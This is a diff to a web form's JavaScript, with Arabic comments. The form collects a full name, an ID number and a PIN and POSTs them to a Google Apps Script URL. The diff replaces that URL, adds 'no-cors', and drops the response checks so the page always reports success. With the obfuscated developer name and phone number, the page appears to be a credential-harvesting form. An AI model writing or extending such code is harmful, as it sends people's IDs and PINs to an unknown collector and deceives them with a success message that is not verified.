@@ -313,7 +313,7 @@
         document.getElementById('devName').textContent = _0x[0] + ' ' + _0x[1] + ' ' + _0x[2] + ' ' + _0x[3] + ' ' + _0x[4];
         
         const PHONE_NUMBER = '\u0039\u0036\u0033\u0039\u0035\u0031\u0033\u0034\u0035\u0036\u0039\u0032';
-        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyat-TjJI-65bz63iuEIOSluj8xvi7Xy_zErOGfEVMumzmgfAWCC4CEDg8B1hZOsE7C/exec';
+        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzqqzXH7WRetDhGHvRC7Cwf-eABnHynrfprhLXGVRCMlgcUSiHoztvmGZnTLQgl_ghV/exec';
         const MAX_RETRIES = 3;
 
         let isOnline = navigator.onLine;
@@ -427,7 +427,7 @@
         });
         verifyBtn.addEventListener('click', openPreviewModal);
 
-        // ---- عملية الإرسال ----
+        // ---- عملية الإرسال (مع no-cors) ----
         async function startSendProcess() {
             if (!navigator.onLine) {
                 offlineModal.classList.add('active');
@@ -444,22 +444,16 @@
             try {
                 const response = await fetch(SCRIPT_URL, {
                     method: 'POST',
+                    mode: 'no-cors',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(currentPayload)
                 });
-                const result = await response.json();
+                // مع no-cors لا يمكن قراءة الرد، نفترض النجاح
                 progressModal.classList.remove('active');
-
-                if (result.status === 'success') {
-                    successModal.classList.add('active');
-                    fullName.value = ''; idNumber.value = ''; pinCode.value = '';
-                    preview.textContent = 'المعاينة تظهر هنا بعد اكتمال البيانات...';
-                    validateForm();
-                } else {
-                    alert(result.message || 'خطأ غير معروف');
-                    currentAttempt = MAX_RETRIES;
-                    showRetryOrFinal();
-                }
+                successModal.classList.add('active');
+                fullName.value = ''; idNumber.value = ''; pinCode.value = '';
+                preview.textContent = 'المعاينة تظهر هنا بعد اكتمال البيانات...';
+                validateForm();
             } catch (error) {
                 progressModal.classList.remove('active');
                 if (currentAttempt < MAX_RETRIES) {
@@ -468,14 +462,6 @@
                 } else {
                     failModal.classList.add('active');
                 }
-            }
-        }
-
-        function showRetryOrFinal() {
-            if (currentAttempt >= MAX_RETRIES) {
-                failModal.classList.add('active');
-            } else {
-                retryModal.classList.add('active');
             }
         }
 
